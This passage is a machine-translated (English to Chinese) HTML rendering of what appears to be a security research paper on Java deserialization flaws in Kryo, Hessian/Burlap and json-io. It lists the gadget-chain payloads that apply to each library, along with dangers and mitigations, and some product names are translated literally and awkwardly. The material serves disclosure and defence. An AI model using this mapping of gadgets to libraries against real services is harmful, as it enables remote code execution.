<div style="position:absolute;top:14252;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认情况下，Kryo 需要公共默认配置</font></font></nobr></div>
<div style="position:absolute;top:14270;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">structor 并且不支持代理，防止</font></font></nobr></div>
<div style="position:absolute;top:14287;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">许多已知的小工具会阻止工作-</font></font></nobr></div>
<div style="position:absolute;top:14305;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ing。</font><font style="vertical-align: inherit;">然而，它的实例化策略是可插拔的</font></font></nobr></div>
<div style="position:absolute;top:14323;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且可以替换为 org.objenesis.strategy。</font></font></nobr></div>
<div style="position:absolute;top:14343;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准实例化策略。</font><font style="vertical-align: inherit;">标准实例化策略</font></font></nobr></div>
<div style="position:absolute;top:14359;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 ReflectionFactory，这意味着</font></font></nobr></div>
<div style="position:absolute;top:14377;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不会调用自定义构造函数，而</font></font></nobr></div>
<div style="position:absolute;top:14396;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">java.lang.Object 构造函数仍然是。</font><font style="vertical-align: inherit;">两者都允许</font></font></nobr></div>
<div style="position:absolute;top:14413;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以通过 finalize() 进行攻击。</font><font style="vertical-align: inherit;">阿尔山·达比尔西亚吉</font></font></nobr></div>
<div style="position:absolute;top:14431;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已经描述了一些令人讨厌的副作用。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25</font></font></font></nobr></div>
<div style="position:absolute;top:14453;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kryo 对自定义排序集合的支持</font></font></nobr></div>
<div style="position:absolute;top:14471;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">比较器，</font><font style="vertical-align: inherit;">可以在此处应用</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#25"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BeanComp</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#23"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">春天-</font></font></a></font></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:14489;left:167"><nobr><a href="https://translate.googleusercontent.com/translate_f#23"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BFAdv 也能</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作，包括恢复的能力</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:14507;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">常规 BeanFactory </font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#23"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.13</font></font></a></font><a href="https://translate.googleusercontent.com/translate_f#23"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">如果替代实例化</font></font></nobr></div>
<div style="position:absolute;top:14525;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">策略</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">†</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被使用，更多的小工具变得可用。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">26</font></font></font></nobr></div>
<div style="position:absolute;top:14547;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kryo 允许在解组期间提供根类型</font></font></nobr></div>
<div style="position:absolute;top:14565;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是实际使用的。</font><font style="vertical-align: inherit;">但是，对于嵌套字段，这些</font></font></nobr></div>
<div style="position:absolute;top:14583;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查仅适用于具体类型，这意味着任何</font></font></nobr></div>
<div style="position:absolute;top:14601;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定非最终类型的字段可用于触发</font></font></nobr></div>
<div style="position:absolute;top:14619;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任意类型的解组。</font></font></nobr></div>
<div style="position:absolute;top:14645;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">额外的危险</font></font></b></nobr></div>
<div style="position:absolute;top:14677;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kryo 提供了额外的转换器，可以启用：</font></font></nobr></div>
<div style="position:absolute;top:14697;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BeanSerializer——如果使用，也暗示setter调用</font></font></nobr></div>
<div style="position:absolute;top:14713;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为 JavaSerializer 和 ExternalizableSerializer。</font></font></nobr></div>
<div style="position:absolute;top:14751;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">减轻</font></font></b></nobr></div>
<div style="position:absolute;top:14783;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kryo 可以设置为要求在</font></font></nobr></div>
<div style="position:absolute;top:14801;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">27</font></font></font></nobr></div>
<div style="position:absolute;top:14265;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用有效载荷</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:14298;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#25"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BeanComp (4.17)</font></font></a></nobr></div>
<div style="position:absolute;top:14328;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#23"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringBFAdv (4.12)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:14374;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用的</font></font></b></nobr></div>
<div style="position:absolute;top:14392;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷</font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">†</font></font></font></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:14425;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#19"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绑定枚举 (4.4)</font></font></a></nobr></div>
<div style="position:absolute;top:14455;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务加载器 (4.3)</font></font></a></nobr></div>
<div style="position:absolute;top:14485;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#20"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LazySearchEnum (4.5)</font></font></a></nobr></div>
<div style="position:absolute;top:14515;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#20"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ImageIO (4.6)</font></font></a></nobr></div>
<div style="position:absolute;top:14545;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#26"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">罗马 (4.18)</font></font></a></nobr></div>
<div style="position:absolute;top:14574;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#23"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringBFAdv (4.12)</font></font></a></nobr></div>
<div style="position:absolute;top:14604;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringCompAdv (4.11)</font></font></a></nobr></div>
<div style="position:absolute;top:14634;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#26"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">常规 (4.19)</font></font></a></nobr></div>
<div style="position:absolute;top:14664;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#24"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">树脂 (4.15)</font></font></a></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:14937;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25</font></font><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-1-kryo"></a><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-1-kryo"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www </font></font></a></font><i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-1-kryo"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-1-kryo"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对比安全</font></font></a></font><i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-1-kryo"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-1-kryo"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com/security-influencers/serialization-must-die-act-1-</font></font></a></font></nobr></div>
</span></font>
<font size="2" color="#0000cc" face="Times"><span style="font-size:9px;font-family:Times;color:#0000cc">
<div style="position:absolute;top:14955;left:186"><nobr><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-1-kryo"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">克里奥</font></font></a></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:14966;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">26</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及诸如 java.util.zip.ZipFile 的终结器之类的东西——（可能进一步利用）内存</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:14982;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">腐败</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:14994;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">27</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然而，这并不是真正出于安全目的，并且有一些副作用，例如类型有</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:15010;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在所有涉及的系统上以相同的顺序注册。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:15071;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:15319;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="13"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 13 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:15481;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.3 粗麻布/粗麻布</font></font></b></nobr></div>
<div style="position:absolute;top:15514;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认情况下，Hessian 和 Burlap 使用无副作用的实例化</font></font></nobr></div>
<div style="position:absolute;top:15532;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 sun.misc.Unsafe，不恢复瞬态场，</font></font></nobr></div>
<div style="position:absolute;top:15549;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不允许任意代理，不支持自定义</font></font></nobr></div>
<div style="position:absolute;top:15567;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收集比较器。</font></font></nobr></div>
<div style="position:absolute;top:15590;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">乍一看，它们似乎在检查 java.io。</font></font></nobr></div>
<div style="position:absolute;top:15609;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可序列化。</font><font style="vertical-align: inherit;">但是，该检查仅适用于</font></font></nobr></div>
<div style="position:absolute;top:15626;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编组而</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不是解组</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">如果那个检查</font></font></nobr></div>
<div style="position:absolute;top:15644;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是有效的，最可利用的对象图通过</font></font></nobr></div>
<div style="position:absolute;top:15662;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他限制无法恢复。</font></font></nobr></div>
<div style="position:absolute;top:15684;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">事实并非如此，它们都可以通过非</font></font></nobr></div>
<div style="position:absolute;top:15702;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可序列化的</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringCompAdv</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#24"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Resin</font></font></a></font><a href="https://translate.googleusercontent.com/translate_f#24"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，以及</font></font></nobr></div>
<div style="position:absolute;top:15720;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可序列化的</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#26"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">罗马</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#24"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XBean</font></font></a></font><a href="https://translate.googleusercontent.com/translate_f#24"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></nobr></div>
<div style="position:absolute;top:15742;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无法将 Groovy 的 MethodClosure 恢复为已读</font></font></nobr></div>
<div style="position:absolute;top:15761;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调用 Resolve() 会引发异常。</font></font></nobr></div>
<div style="position:absolute;top:15783;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以在解组期间指定根类型，即</font></font></nobr></div>
<div style="position:absolute;top:15800;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用过的; </font><font style="vertical-align: inherit;">然而，人们可以提供任意的，甚至不存在的，</font></font></nobr></div>
<div style="position:absolute;top:15818;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将使用任意方法解组的嵌套属性</font></font></nobr></div>
<div style="position:absolute;top:15836;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型。</font></font></nobr></div>
<div style="position:absolute;top:15862;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">额外的危险</font></font></b></nobr></div>
<div style="position:absolute;top:15894;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供一个可选的 BeanSerializerFactory，它</font></font></nobr></div>
<div style="position:absolute;top:15912;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果使用则隐含 setter 调用。</font><font style="vertical-align: inherit;">后备属性-</font></font></nobr></div>
<div style="position:absolute;top:15930;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 JavaDeserializer 的调用各种构造函数</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">28</font></font></font></nobr></div>
<div style="position:absolute;top:15948;left:173"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有空/默认参数。</font><font style="vertical-align: inherit;">远程对象机械</font></font></nobr></div>
<div style="position:absolute;top:15966;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nism，如果配置，可能可以用于 DOS，似乎</font></font></nobr></div>
<div style="position:absolute;top:15984;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许构建模拟对象</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">29</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，并且可能允许</font></font></nobr></div>
<div style="position:absolute;top:16002;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">否则不会利用端点</font></font></nobr></div>
<div style="position:absolute;top:16020;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击者可以访问。</font></font></nobr></div>
<div style="position:absolute;top:16057;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">减轻</font></font></b></nobr></div>
<div style="position:absolute;top:16090;left:173"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版本 4.0.51 带有对白名单的可选支持-</font></font></nobr></div>
<div style="position:absolute;top:16108;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 ClassFactory。</font></font></nobr></div>
<div style="position:absolute;top:15527;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参考</font></font></b></nobr></div>
<div style="position:absolute;top:15556;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">报告</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括</font></font></nobr></div>
<div style="position:absolute;top:15574;left:602"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RPC 小服务程序</font></font></nobr></div>
<div style="position:absolute;top:15604;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">报道</font></font></b></nobr></div>
<div style="position:absolute;top:15622;left:602"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考乔</font></font></nobr></div>
<div style="position:absolute;top:15622;left:682"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">树脂</font></font></nobr></div>
<div style="position:absolute;top:15640;left:600"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(RPC/HTMP)</font></font></nobr></div>
<div style="position:absolute;top:15670;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">联合国资源规划署</font></font></b></nobr></div>
<div style="position:absolute;top:15688;left:601"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TomEE/openejb-</font></font></nobr></div>
<div style="position:absolute;top:15706;left:602"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">黑森州</font></font></nobr></div>
<div style="position:absolute;top:15736;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ASRC</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阿里巴巴柑橘</font></font></nobr></div>
<div style="position:absolute;top:15754;left:602"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">框架</font></font></nobr></div>
<div style="position:absolute;top:15783;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">REJECT </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">30</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Spring Re-</font></font></nobr></div>
<div style="position:absolute;top:15801;left:602"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">摩丁</font></font></nobr></div>
<div style="position:absolute;top:15846;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用有效载荷</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:15880;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringCompAdv (4.11)</font></font></a></nobr></div>
<div style="position:absolute;top:15910;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#26"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">罗马 (4.18)</font></font></a></nobr></div>
<div style="position:absolute;top:15939;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#24"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XBean (4.14)</font></font></a></nobr></div>
<div style="position:absolute;top:15969;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#24"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">树脂 (4.15)</font></font></a></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:16214;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">28 个</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能启用终结器攻击</font></font></font></nobr></div>
<div style="position:absolute;top:16228;left:168"><nobr><font style="vertical-align: inherit;"><font style="font-size:9px"><font style="vertical-align: inherit;">攻击者控制其返回值的任意接口类型的</font></font><font style="vertical-align: inherit;">29 个</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理，这可以是</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:16244;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对构建小工具很有用，但本身并不是真正的漏洞</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:16256;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">30</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与之前基于 Java 序列化的调用程序一样，Spring 团队拒绝为</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:16272;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些问题，相反，他们很乐意为用户提供即时远程代码执行漏洞</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:16333;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:16581;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="14"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 14 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:16743;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.4 json-io</font></font></b></nobr></div>
<div style="position:absolute;top:16776;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是否调用或多或少的任意构造函数，不支持</font></font></nobr></div>
<div style="position:absolute;top:16794;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于代理。</font><font style="vertical-align: inherit;">暂态字段不会被保存，但会被保存</font></font></nobr></div>
<div style="position:absolute;top:16811;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果手动指定，则恢复。</font><font style="vertical-align: inherit;">这个包括几个</font></font></nobr></div>
<div style="position:absolute;top:16829;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他好奇心：</font></font></nobr></div>
<div style="position:absolute;top:16851;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• “Brute-Force-Construction”：如果没有默认</font></font></nobr></div>
<div style="position:absolute;top:16870;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构造函数，json-io 尝试使用其他构造函数</font></font></nobr></div>
<div style="position:absolute;top:16888;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">空/默认值，直到成功。</font></font></nobr></div>
<div style="position:absolute;top:16909;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• “两阶段重建”：收藏依赖于</font></font></nobr></div>
<div style="position:absolute;top:16929;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hashCode() 仅在所有其他观察后恢复</font></font></nobr></div>
<div style="position:absolute;top:16946;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象正在并且可能以意想不到的顺序发生，</font></font></nobr></div>
<div style="position:absolute;top:16964;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">即嵌套集合可能无法恢复时</font></font></nobr></div>
<div style="position:absolute;top:16983;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hashCode() 被调用。</font><font style="vertical-align: inherit;">如果小工具是由 col-</font></font></nobr></div>
<div style="position:absolute;top:17000;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选集插入及其本身需要一个集合字段</font></font></nobr></div>
<div style="position:absolute;top:17018;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能需要一些技巧才能获得这些</font></font></nobr></div>
<div style="position:absolute;top:17036;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正确的顺序。</font></font></nobr></div>
<div style="position:absolute;top:17058;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以将标准库 TemplatesImpl 恢复为</font></font></nobr></div>
<div style="position:absolute;top:17076;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及 Spring 的 DefaultListableBeanFactory，因此</font></font></nobr></div>
<div style="position:absolute;top:17094;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">某些小工具可以直接执行字节码。</font></font></nobr></div>
<div style="position:absolute;top:17116;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不能指定根类型。</font></font></nobr></div>
<div style="position:absolute;top:17142;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">减轻</font></font></b></nobr></div>
<div style="position:absolute;top:17174;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有明显的方法来实现类型白名单。</font><font style="vertical-align: inherit;">主要的-</font></font></nobr></div>
<div style="position:absolute;top:17192;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">容器无反应。</font></font></nobr></div>
<div style="position:absolute;top:16789;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参考</font></font></b></nobr></div>
</span></font>
<font size="3" color="#0000cc" face="Times"><span style="font-size:12px;font-family:Times;color:#0000cc">
<div style="position:absolute;top:16818;left:564"><nobr><b><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://jira.magnolia-cms.com/browse/MGNLCACHE-165"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MGNLCACHE-165</font></font></a></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
